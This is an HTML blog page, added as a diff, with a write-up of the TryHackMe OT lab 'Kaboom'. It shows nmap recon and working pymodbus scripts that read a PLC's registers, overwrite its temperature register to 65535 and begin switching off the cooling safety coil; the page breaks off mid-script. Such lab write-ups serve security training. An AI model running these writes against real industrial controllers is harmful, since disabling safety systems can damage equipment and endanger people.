@@ -1,0 +1,696 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Kaboom | Jenn Shagrin</title>
+<meta name="keywords" content="">
+<meta name="description" content="TryHackMe OT pentesting: Modbus TCP on port 502 with no authentication, pymodbus register and coil discovery, temperature register write to 65535, safety coil obliteration, explosion state achieved.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/kaboom.html">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+    <link rel="stylesheet" href="/assets/css/accents.css">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+            .list {
+                background: var(--theme);
+            }
+            .toc {
+                background: var(--entry);
+            }
+        }
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/extended/harmonize.css">
+<link rel="stylesheet" href="/assets/css/accents.css">
+<meta property="og:url" content="https://jennshaggy.github.io/kaboom.html">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="Kaboom">
+<meta property="og:description" content="TryHackMe OT pentesting: Modbus TCP on port 502 with no authentication, pymodbus register and coil discovery, temperature register write to 65535, safety coil obliteration, explosion state achieved.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Kaboom">
+<meta name="twitter:description" content="TryHackMe OT pentesting: Modbus TCP on port 502 with no authentication, pymodbus register and coil discovery, temperature register write to 65535, safety coil obliteration, explosion state achieved.">
+</head>
+
+<body id="top">
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/security-defense/" title="Security &amp; Defense">
+                    <span>Security &amp; Defense</span>
+                </a>
+            </li>
+            <li>
+                <a href="/networking.html" title="Networking">
+                    <span>Networking</span>
+                </a>
+            </li>
+            <li>
+                <a href="/systems-foundation.html" title="Systems">
+                    <span>Systems</span>
+                </a>
+            </li>
+            <li>
+                <a href="/applied-projects.html" title="Penetration Testing">
+                    <span class="active">Penetration Testing</span>
+                </a>
+            </li>
+            <li>
+                <a href="/platforms-training.html" title="Training">
+                    <span>Training</span>
+                </a>
+            </li>
+            <li>
+                <a href="/ai-security/" title="AI Security" target="_blank" rel="noopener noreferrer">
+                    <span>AI Security</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+<main class="main">
+<article class="post-single">
+  <header class="post-header">
+    <h1 class="post-title entry-hint-parent">Kaboom</h1>
+    <div class="post-description">TryHackMe OT pentesting lab. Modbus TCP exploitation via pymodbus: register discovery, temperature manipulation, safety mechanism obliteration, and explosion state achieved.</div>
+  </header>
+
+  <div class="post-content">
+
+<p>As a disclaimer, the only things I know about OT (Operational Technology) involve light knowledge of SCADA, and that OT is the control over how systems move. Without OT, no system is moving forward.</p>
+
+<p>I do, however, know a thing or two about assuming the role of an APT.</p>
+
+<hr>
+
+<h2>Enumeration</h2>
+
+<pre><code class="language-bash">nmap -Pn -sC -sV -p- -T4 TARGET_IP -oA kaboom_nmap</code></pre>
+
+<p>And...</p>
+
+<pre><code class="language-bash">nmap -sS -Pn -sC -sV --script=vuln -T4 -A TARGET_IP -oA kaboom_nmap_detailed</code></pre>
+
+<img src="/images/kaboom/Screenshot 2026-06-29 at 11.06.21 AM.png" alt="Nmap scan results for Kaboom target" style="max-width:100%;margin:2rem 0;">
+
+<p>I'll spare you the entirety of the output from the second Nmap, but here are the highlights of the scan output:</p>
+
+<img src="/images/kaboom/Screenshot 2026-06-29 at 11.07.47 AM.png" alt="Second Nmap highlights showing OT ports including Siemens S7 and Modbus TCP" style="max-width:100%;margin:2rem 0;">
+<img src="/images/kaboom/Screenshot 2026-06-29 at 11.08.31 AM.png" alt="Second Nmap continued showing EtherNet/IP on port 44818" style="max-width:100%;margin:2rem 0;">
+
+<p>Open Ports:</p>
+<ul>
+<li>Port 22: SSH</li>
+<li>Port 80: PLC CCTV Simulator</li>
+<li>Port 102: Siemens S7</li>
+<li>Port 502: Modbus TCP</li>
+<li>Port 8080: Authenticated web app</li>
+<li>Port 44818: EtherNet/IP</li>
+</ul>
+
+<p>Port 502 serving <code>modbus</code> is specifically mentioned in the challenge synopsis. <code>modbus</code> is an OT communication protocol used for the exchange of control messages on industrial networks. <code>modbus</code> has a request-response scheme, and a list of exploitable vulnerabilities:</p>
+
+<ul>
+<li>Messages are transmitted in plaintext, lacking Confidentiality</li>
+<li>There are no integrity checks built into the <code>modbus</code> protocol</li>
+<li>No authentication at any level</li>
+<li>Lack of session structure, leaving <code>modbus</code> communication vulnerable to command injection</li>
+<li>Simplistic framing: <code>modbus</code>/TCP frames are sent over an established TCP connection, and while TCP connections are typically reliable, the weaknesses in the architecture become clear when considering the first four listed vulnerabilities.</li>
+</ul>
+
+<p>The list doesn't stop there, but hopefully I've helped make a point.</p>
+
+<hr>
+
+<h2>Web Services</h2>
+
+<p>Lets see what Port 80 beholds:</p>
+
+<img src="/images/kaboom/Screenshot 2026-06-29 at 12.03.06 PM.png" alt="PLC CCTV Simulator on Port 80 showing pump and temperature status" style="max-width:100%;margin:2rem 0;">
+
+<p>Very clear imagery.</p>
+
+<p>Deeper inspection of both web services:</p>
+
+<pre><code class="language-bash">curl -s http://TARGET_IP/ | head -n 80
+curl -s -L http://TARGET_IP:8080/ | head -n 120</code></pre>
+
+<p>In the <code>curl</code> response on Port 8080, we confirm that it's serving an OpenPLC web interface:</p>
+
+<img src="/images/kaboom/Screenshot 2026-06-29 at 12.15.34 PM.png" alt="curl response from Port 8080 confirming OpenPLC web interface" style="max-width:100%;margin:2rem 0;">
+
+<p>A quick read-only Modbus discovery via Nmap:</p>
+
+<pre><code class="language-bash">nmap -Pn -p502 --script modbus-discover TARGET_IP</code></pre>
+
+<img src="/images/kaboom/Screenshot 2026-06-29 at 12.17.32 PM.png" alt="Nmap Modbus discovery showing Unit ID 1 responding" style="max-width:100%;margin:2rem 0;">
+
+<p>Long story short, Modbus TCP is reachable.
+Unit ID 1 responds to us.
+The error doesn't indicate that Modbus isn't available, but that Nmap's generic discovery request is unavailable.</p>
+
+<p>Exploring the CCTV page source for anything that might reveal where it obtains PLC values:</p>
+
+<pre><code class="language-bash">curl -s http://TARGET_IP/ | grep -Ei 'status|pressure|pump|temperature|fetch|api|static|script'</code></pre>
+
+<img src="/images/kaboom/Screenshot 2026-06-29 at 12.52.28 PM.png" alt="CCTV page source grep revealing /api/state polling endpoint" style="max-width:100%;margin:2rem 0;">
+
+<p>Interesting. The CCTV page polls <code>/api/state</code>. Lets see if we can uncover the simulator's current process state. Even better would be revealing the exact condition that changes post <code>modbus</code> rewrite:</p>
+
+<pre><code class="language-bash">curl -i http://TARGET_IP/api/state</code></pre>
+
+<img src="/images/kaboom/Screenshot 2026-06-29 at 12.54.41 PM.png" alt="/api/state curl response showing current process state" style="max-width:100%;margin:2rem 0;">
+
+<p>This result is reflective of what we're seeing in-browser over Port 80. The browser is just rendering <code>/api/state</code>, which effectively serves as a friendly status update.</p>
+
+<p>We need the real details, not a facade.</p>
+
+<hr>
+
+<h2>pymodbus Setup</h2>
+
+<p>Time to get scripty again. We need to see addresses and values from the PLC (the Controller). Especially values that change.</p>
+
+<p>The room wants us to overheat and essentially detonate the <code>modbus</code> system, and the best way to interact with it is via Python <code>pymodbus</code>.</p>
+
+<p>Installing it in a virtual environment:</p>
+
+<pre><code class="language-bash">sudo apt install -y python3-venv
+python3 -m venv ~/venvs/pymodbus
+source ~/venvs/pymodbus/bin/activate</code></pre>
+
+<img src="/images/kaboom/Screenshot 2026-06-29 at 11.51.52 AM.png" alt="Virtual environment creation and activation for pymodbus" style="max-width:100%;margin:2rem 0;">
+
+<p>Installing inside the virtual environment:</p>
+
+<pre><code class="language-bash">python -m pip install --upgrade pip
+python -m pip install pymodbus</code></pre>
+
+<p>Verification:</p>
+
+<pre><code class="language-bash">python -c "import pymodbus; print(pymodbus.__version__)"</code></pre>
+
+<img src="/images/kaboom/Screenshot 2026-06-29 at 11.53.33 AM.png" alt="pymodbus version check confirming successful installation" style="max-width:100%;margin:2rem 0;">
+
+<p>Quick notes on <code>pymodbus</code> commands:</p>
+
+<p>To exit the service: <code>deactivate</code><br>
+To restart it: <code>source ~/venvs/pymodbus/bin/activate</code></p>
+
+<hr>
+
+<h2>Register Discovery</h2>
+
+<p><code>pymodbus</code> does not know which register represents temperature, so you'd typically need the device's <code>modbus register map</code>.</p>
+
+<p>In this specific environment, we need the Target IP.
+We'll create a Modbus TCP script that will read the temp for us:</p>
+
+<pre><code class="language-bash">nano read_temp.py</code></pre>
+
+<p>Inside, paste the following and make sure to replace <code>"TARGET_IP"</code> with the accurate IP address:</p>
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span><span class="w"> </span><span class="nn">pymodbus.client</span><span class="w"> </span><span class="kn">import</span> <span class="n">ModbusTcpClient</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s2">&quot;TARGET_IP&quot;</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">502</span>
+<span class="n">DEVICE_ID</span> <span class="o">=</span> <span class="mi">1</span>
+<span class="n">REGISTER</span> <span class="o">=</span> <span class="mi">0</span>      <span class="c1"># Replace with the documented temperature register</span>
+<span class="n">SCALE</span> <span class="o">=</span> <span class="mi">10</span>        <span class="c1"># Common: raw 253 means 25.3°C</span>
+
+<span class="n">client</span> <span class="o">=</span> <span class="n">ModbusTcpClient</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="n">PORT</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">client</span><span class="o">.</span><span class="n">connect</span><span class="p">():</span>
+        <span class="k">raise</span> <span class="ne">ConnectionError</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Could not connect to </span><span class="si">{</span><span class="n">HOST</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">PORT</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+    <span class="n">result</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">read_holding_registers</span><span class="p">(</span>
+        <span class="n">address</span><span class="o">=</span><span class="n">REGISTER</span><span class="p">,</span>
+        <span class="n">count</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
+        <span class="n">device_id</span><span class="o">=</span><span class="n">DEVICE_ID</span><span class="p">,</span>
+    <span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">result</span><span class="o">.</span><span class="n">isError</span><span class="p">():</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Modbus error: </span><span class="si">{</span><span class="n">result</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">raw</span> <span class="o">=</span> <span class="n">result</span><span class="o">.</span><span class="n">registers</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Raw register value: </span><span class="si">{</span><span class="n">raw</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Temperature: </span><span class="si">{</span><span class="n">raw</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">SCALE</span><span class="si">:</span><span class="s2">.1f</span><span class="si">}</span><span class="s2"> °C&quot;</span><span class="p">)</span>
+<span class="k">finally</span><span class="p">:</span>
+    <span class="n">client</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div>
+
+<p>Save and exit, and now we run it:</p>
+
+<pre><code class="language-bash">source ~/venvs/pymodbus/bin/activate
+python read_temp.py</code></pre>
+
+<p>Alright. We're sitting</p>
+
+<img src="/images/kaboom/Screenshot 2026-06-29 at 12.01.11 PM.png" alt="read_temp.py output showing current register 0 temperature value" style="max-width:100%;margin:2rem 0;">
+
+<p>As we observed on Port 80, cooling is not in place.</p>
+
+<p>Head back to the <code>modbus</code> terminal, and create the following:</p>
+
+<pre><code class="language-bash">nano scan_modbus.py</code></pre>
+
+<p>Inside, paste the following, making sure to insert the Target IP after <code>HOST =</code>:</p>
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span><span class="w"> </span><span class="nn">pymodbus.client</span><span class="w"> </span><span class="kn">import</span> <span class="n">ModbusTcpClient</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s2">&quot;TARGET_IP&quot;</span>
+<span class="n">UNIT</span> <span class="o">=</span> <span class="mi">1</span>
+
+<span class="n">client</span> <span class="o">=</span> <span class="n">ModbusTcpClient</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">502</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="ow">not</span> <span class="n">client</span><span class="o">.</span><span class="n">connect</span><span class="p">():</span>
+    <span class="k">raise</span> <span class="ne">SystemExit</span><span class="p">(</span><span class="s2">&quot;Could not connect&quot;</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">kind</span><span class="p">,</span> <span class="n">reader</span> <span class="ow">in</span> <span class="p">(</span>
+    <span class="p">(</span><span class="s2">&quot;holding&quot;</span><span class="p">,</span> <span class="n">client</span><span class="o">.</span><span class="n">read_holding_registers</span><span class="p">),</span>
+    <span class="p">(</span><span class="s2">&quot;input&quot;</span><span class="p">,</span> <span class="n">client</span><span class="o">.</span><span class="n">read_input_registers</span><span class="p">),</span>
+<span class="p">):</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[</span><span class="si">{</span><span class="n">kind</span><span class="si">}</span><span class="s2"> registers]&quot;</span><span class="p">)</span>
+
+    <span class="k">for</span> <span class="n">address</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">21</span><span class="p">):</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">reader</span><span class="p">(</span>
+            <span class="n">address</span><span class="o">=</span><span class="n">address</span><span class="p">,</span>
+            <span class="n">count</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
+            <span class="n">device_id</span><span class="o">=</span><span class="n">UNIT</span><span class="p">,</span>
+        <span class="p">)</span>
+
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">result</span><span class="o">.</span><span class="n">isError</span><span class="p">():</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">address</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">result</span><span class="o">.</span><span class="n">registers</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[coils]&quot;</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">address</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">):</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">read_coils</span><span class="p">(</span>
+        <span class="n">address</span><span class="o">=</span><span class="n">address</span><span class="p">,</span>
+        <span class="n">count</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
+        <span class="n">device_id</span><span class="o">=</span><span class="n">UNIT</span><span class="p">,</span>
+    <span class="p">)</span>
+
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">result</span><span class="o">.</span><span class="n">isError</span><span class="p">():</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">address</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">result</span><span class="o">.</span><span class="n">bits</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[discrete inputs]&quot;</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">address</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">):</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">read_discrete_inputs</span><span class="p">(</span>
+        <span class="n">address</span><span class="o">=</span><span class="n">address</span><span class="p">,</span>
+        <span class="n">count</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
+        <span class="n">device_id</span><span class="o">=</span><span class="n">UNIT</span><span class="p">,</span>
+    <span class="p">)</span>
+
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">result</span><span class="o">.</span><span class="n">isError</span><span class="p">():</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">address</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">result</span><span class="o">.</span><span class="n">bits</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="n">client</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div>
+
+<pre><code class="language-bash">python scan_modbus.py</code></pre>
+
+<img src="/images/kaboom/Screenshot 2026-06-29 at 1.07.31 PM.png" alt="scan_modbus.py output showing register 0 as the only non-zero value" style="max-width:100%;margin:2rem 0;">
+
+<p>The read-only <code>modbus</code> scan makes it clear that register 0's values are the only ones that change. The value changed from 52 to 51 in just the last few minutes of recon.</p>
+
+<p>The script reported for all coils, input registers, and holding registers. Register 0's holding register value is the only one not set at 0.</p>
+
+<hr>
+
+<h2>Overpressure</h2>
+
+<p>Lets see if we can get the PLC Controller to move. If we can control the values, we can push it to destruction.</p>
+
+<p>New Python script. Same <code>pymodbus</code> terminal:</p>
+
+<pre><code class="language-bash">nano test_write.py</code></pre>
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span><span class="w"> </span><span class="nn">pymodbus.client</span><span class="w"> </span><span class="kn">import</span> <span class="n">ModbusTcpClient</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s2">&quot;TARGET_IP&quot;</span>
+<span class="n">UNIT</span> <span class="o">=</span> <span class="mi">1</span>
+
+<span class="n">client</span> <span class="o">=</span> <span class="n">ModbusTcpClient</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">502</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">client</span><span class="o">.</span><span class="n">connect</span><span class="p">():</span>
+        <span class="k">raise</span> <span class="ne">SystemExit</span><span class="p">(</span><span class="s2">&quot;Could not connect&quot;</span><span class="p">)</span>
+
+    <span class="n">before</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">read_holding_registers</span><span class="p">(</span>
+        <span class="n">address</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span>
+        <span class="n">count</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
+        <span class="n">device_id</span><span class="o">=</span><span class="n">UNIT</span><span class="p">,</span>
+    <span class="p">)</span>
+
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Before: </span><span class="si">{</span><span class="n">before</span><span class="o">.</span><span class="n">registers</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+    <span class="n">result</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">write_register</span><span class="p">(</span>
+        <span class="n">address</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span>
+        <span class="n">value</span><span class="o">=</span><span class="mi">100</span><span class="p">,</span>
+        <span class="n">device_id</span><span class="o">=</span><span class="n">UNIT</span><span class="p">,</span>
+    <span class="p">)</span>
+
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Write result: </span><span class="si">{</span><span class="n">result</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+    <span class="n">after</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">read_holding_registers</span><span class="p">(</span>
+        <span class="n">address</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span>
+        <span class="n">count</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
+        <span class="n">device_id</span><span class="o">=</span><span class="n">UNIT</span><span class="p">,</span>
+    <span class="p">)</span>
+
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;After: </span><span class="si">{</span><span class="n">after</span><span class="o">.</span><span class="n">registers</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="k">finally</span><span class="p">:</span>
+    <span class="n">client</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div>
+
+<p>Before running this, have the in-browser page over Port 80 visible/nearby to check for state changes.</p>
+
+<p>We want to see if register 0 pushes above the 51-52 value, and see if the status changes from "<code>Cooling OFF, Low Temperature</code>" to something dangerous.</p>
+
+<p>Read, aim...</p>
+
+<img src="/images/kaboom/Screenshot 2026-06-29 at 1.23.29 PM.png" alt="Port 80 browser state showing Cooling OFF Low Temperature before test_write" style="max-width:100%;margin:2rem 0;">
+
+<p>...fire:</p>
+
+<pre><code class="language-bash">python test_write.py</code></pre>
+
+<img src="/images/kaboom/Screenshot 2026-06-29 at 1.24.08 PM.png" alt="test_write.py output showing register 0 written to 100" style="max-width:100%;margin:2rem 0;">
+
+<p>This looks promisingly destructive.</p>
+
+<p>Register 0 definitely controls the simulated temperature.</p>
+
+<p>Lets see if we can push the value higher than 100. Really crank up the heat.</p>
+
+<p>In <code>test_write.py</code>, change <code>value=100</code> to <code>value=65535</code>.
+It's located here in the script:</p>
+
+<img src="/images/kaboom/Screenshot 2026-06-29 at 1.26.56 PM.png" alt="test_write.py script showing value location for 65535 edit" style="max-width:100%;margin:2rem 0;">
+
+<p>Get ready to pull the trigger and observe again:</p>
+
+<pre><code class="language-bash">python test_write.py</code></pre>
+
+<img src="/images/kaboom/Screenshot 2026-06-29 at 1.28.08 PM.png" alt="test_write.py output showing register 0 written to 65535" style="max-width:100%;margin:2rem 0;">
+
+<p>Muahahahaha. APT status = unlocked.</p>
+
+<p>Something may be preventing a full-scale blowout.
+We'll do a quick check of the coil statuses with the previous script, <code>scan_modbus.py</code>.
+All of the coil values previously came in as <code>false</code>, but that may have changed:</p>
+
+<pre><code class="language-bash">python scan_modbus.py</code></pre>
+
+<p>Well hello, Coil 15. I see you.</p>
+
+<img src="/images/kaboom/Screenshot 2026-06-29 at 1.30.48 PM.png" alt="scan_modbus.py output showing Coil 15 flipped to True after temperature spike" style="max-width:100%;margin:2rem 0;">
+
+<p>We can now map the control logic with evidence and conviction:</p>
+<ul>
+<li>Holding register 0 = process temperature</li>
+<li>Coil 15 = cooling system</li>
+</ul>
+
+<p>When pushed to <code>65535</code>, the PLC controller auto-flips Coil 15 to on (aka <code>Coil 15 = True</code>), which is what the in-browser status displays.</p>
+
+<p>That also means theres a safety mechanism standing in our way.
+To achieve full destruction, we need to turn it off.</p>
+
+<p>Python most certainly isn't letting us down, so we tango once more:</p>
+
+<pre><code class="language-bash">nano cooling_obliterato.py</code></pre>
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span><span class="w"> </span><span class="nn">pymodbus.client</span><span class="w"> </span><span class="kn">import</span> <span class="n">ModbusTcpClient</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s2">&quot;TARGET_IP&quot;</span>
+<span class="n">UNIT</span> <span class="o">=</span> <span class="mi">1</span>
+<span class="n">COOLING_COIL</span> <span class="o">=</span> <span class="mi">15</span>
+
+<span class="n">client</span> <span class="o">=</span> <span class="n">ModbusTcpClient</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">502</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">client</span><span class="o">.</span><span class="n">connect</span><span class="p">():</span>
+        <span class="k">raise</span> <span class="ne">SystemExit</span><span class="p">(</span><span class="s2">&quot;Could not connect&quot;</span><span class="p">)</span>
+
+    <span class="n">before</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">read_coils</span><span class="p">(</span>
+        <span class="n">address</span><span class="o">=</span><span class="n">COOLING_COIL</span><span class="p">,</span>
+        <span class="n">count</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
+        <span class="n">device_id</span><span class="o">=</span><span class="n">UNIT</span><span class="p">,</span>
+    <span class="p">)</span>
+
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Cooling before: </span><span class="si">{</span><span class="n">before</span><span class="o">.</span><span class="n">bits</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+    <span class="n">result</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">write_coil</span><span class="p">(</span>
+        <span class="n">address</span><span class="o">=</span><span class="n">COOLING_COIL</span><span class="p">,</span>
+        <span class="n">value</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span>
+        <span class="n">device_id</span><span class="o">=</span><span class="n">UNIT</span><span class="p">,</span>
+    <span class="p">)</span>
+
